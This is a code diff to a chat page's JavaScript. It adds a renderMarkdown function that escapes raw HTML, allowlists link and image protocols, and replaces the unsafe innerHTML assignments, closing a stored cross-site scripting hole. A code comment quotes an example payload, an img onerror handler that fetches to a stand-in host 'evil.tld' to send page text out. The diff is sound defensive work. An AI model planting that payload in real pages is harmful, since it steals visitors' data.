@@ -273,6 +273,63 @@ function switchTabInternal(tabName) {
 }
 
 
+// ── Rendering visitor and model text ───────────────────────────────────
+
+/* Markdown -> HTML, with any raw markup made inert. THE one place that puts
+   text somebody else wrote into innerHTML.
+
+   WHY THIS EXISTS. `marked` dropped its sanitize option in v5 and passes raw
+   HTML straight through, and every caller assigned the result to innerHTML.
+   So a visitor who typed
+
+       <img src=x onerror="fetch('https://evil.tld/?d='+document.body.innerText)">
+
+   got script execution on our own origin. Worse than a one-off: saveToHistory()
+   writes the message to localStorage and loadHistory() replays it through the
+   same sink on every later page load, so at a booth kiosk it fired again for
+   every later visitor, on the page that also collects their name and mobile
+   number.
+
+   ESCAPE FIRST, PARSE SECOND. Escaping & and < before marked sees the text
+   means no tag can ever open, while markdown syntax keeps working: * _ # `
+   and - are untouched.
+
+   > " and ' are deliberately NOT escaped. A tag cannot open without <, marked
+   escapes what it puts into attributes itself, and escaping > would break
+   markdown blockquotes for no security gain.
+
+   LINK PROTOCOLS ARE CHECKED AFTER PARSING, because [x](javascript:...) never
+   contains a < at all, so escaping cannot reach it. */
+function renderMarkdown(element, text) {
+    const raw = String(text === null || text === undefined ? '' : text);
+    if (typeof marked === 'undefined') {
+        // No markdown library on the page. textContent, never innerHTML: the
+        // old fallback here was text.replace(/\n/g, '<br>'), which handed the
+        // same raw markup to the same sink.
+        element.textContent = raw;
+        return;
+    }
+    element.innerHTML = marked.parse(
+        raw.replace(/&/g, '&amp;').replace(/</g, '&lt;'));
+    const SAFE_URL = /^(https?:|mailto:|tel:|[/#])/i;
+    element.querySelectorAll('a').forEach(a => {
+        // An allowlist, so a protocol nobody thought of is refused by default.
+        if (!SAFE_URL.test((a.getAttribute('href') || '').trim())) {
+            a.removeAttribute('href');
+        }
+        a.target = '_blank';
+        a.rel = 'noopener noreferrer';
+    });
+    // Markdown's ![alt](url) makes a real <img>. Not script execution, but an
+    // off-site src is a tracking pixel any visitor could plant in the history
+    // that later visitors replay, so it gets the same allowlist.
+    element.querySelectorAll('img').forEach(img => {
+        if (!SAFE_URL.test((img.getAttribute('src') || '').trim())) {
+            img.removeAttribute('src');
+        }
+    });
+}
+
 // ── Message Logic ──────────────────────────────────────────────────────
 
 function typeWriter(element, text, speed = 20) {
@@ -296,12 +353,7 @@ function typeWriter(element, text, speed = 20) {
             if (chatContent) chatContent.scrollTop = chatContent.scrollHeight;
             setTimeout(type, speed);
         } else {
-            if (typeof marked !== 'undefined') {
-                element.innerHTML = marked.parse(text);
-                element.querySelectorAll('a').forEach(a => a.target = '_blank');
-            } else {
-                element.innerHTML = text.replace(/\n/g, '<br>');
-            }
+            renderMarkdown(element, text);
         }
     }
     type();
@@ -324,12 +376,7 @@ function addMessage(content, type, save = true, instant = false) {
     if (type === 'bot' && !instant) {
         typeWriter(bubble, content);
     } else {
-        if (typeof marked !== 'undefined') {
-            bubble.innerHTML = marked.parse(content);
-            bubble.querySelectorAll('a').forEach(a => a.target = '_blank');
-        } else {
-            bubble.textContent = content;
-        }
+        renderMarkdown(bubble, content);
     }
     chatContent.scrollTop = chatContent.scrollHeight;
     if (save) saveToHistory(content, type);
